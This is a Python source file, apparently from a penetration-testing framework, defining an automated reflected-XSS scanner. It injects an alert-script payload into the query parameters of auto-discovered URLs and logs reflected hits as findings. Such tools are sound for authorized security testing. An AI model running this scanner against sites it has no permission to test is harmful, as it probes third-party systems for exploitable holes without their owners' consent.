import requests
from core.mcp_protocol import MCPTool
from core.auto_discovery import AutoDiscovery


class XSSScanner(MCPTool):
    def __init__(self, project_id, guardian):
        super().__init__(
            name="XSS Scanner",
            description="Escaneo inteligente de XSS (Auto-Discovery integrado)",
            mitre_id="T1059.007",
            project_id=project_id,
            guardian=guardian,
        )
        self.payload = "<script>alert('XSS')</script>"

    def _execute(self, user_input):
        # Magia automática
        discoverer = AutoDiscovery()
        targets = discoverer.resolve_targets(user_input)

        if not targets:
            print("    ❌ No se encontraron objetivos XSS.")
            return {"status": "FAILED"}

        print(f"\n    [*] Probando reflejos XSS en {len(targets)} URLs...")

        found = 0
        for url in targets:
            # url viene como http://site.com/page.php?param=1
            # Quitamos el valor '1' para concatenar nuestro payload
            base_attack = url.rsplit("=", 1)[0] + "="
            attack_url = base_attack + self.payload

            try:
                print(f"    ⚔️  Target: {base_attack}...")
                res = requests.get(attack_url, timeout=3)
                if self.payload in res.text:
                    print(f"      🔥 XSS REFLEJADO CONFIRMADO!")
                    self.save_finding(
                        title="Reflected XSS",
                        target=url,
                        evidence=f"Payload: {self.payload}\nURL: {attack_url}",
                        severity="Medium",
                        cvss_score=6.1,
                    )
                    found += 1
            except:
                pass

        return {"status": "FINISHED", "found": found}
